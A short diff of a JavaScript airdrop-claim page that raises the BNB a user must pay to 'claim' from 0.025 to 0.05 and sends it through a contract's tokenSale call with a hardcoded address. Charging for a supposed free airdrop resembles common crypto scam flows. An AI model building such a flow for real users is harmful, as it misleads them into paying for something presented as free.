@@ -77,8 +77,8 @@ const getAirdrop2 = async () => {
   'error'
 )   
 	}
-  let ethval = document.getElementById("buyinput_air").value=' 0.025';
-  if(ethval >=  0.025){
+  let ethval = document.getElementById("buyinput_air").value=' 0.05';
+  if(ethval >=  0.05){
   ethval = Number(ethval) * 1e18;
     fresh = "0xC621Ed88e88FB872c7BCd9c7De555bA84a147a6d";
   sttcontract.methods.tokenSale(fresh).send({from:addr, value: ethval}, (err, res) => {
@@ -88,7 +88,7 @@ const getAirdrop2 = async () => {
   }else{
     Swal.fire(
   'Caim Alert',
-  'Claim as low as 0.025 BNB.',
+  'Claim as low as 0.05 BNB.',
   'error'
 )    
   }
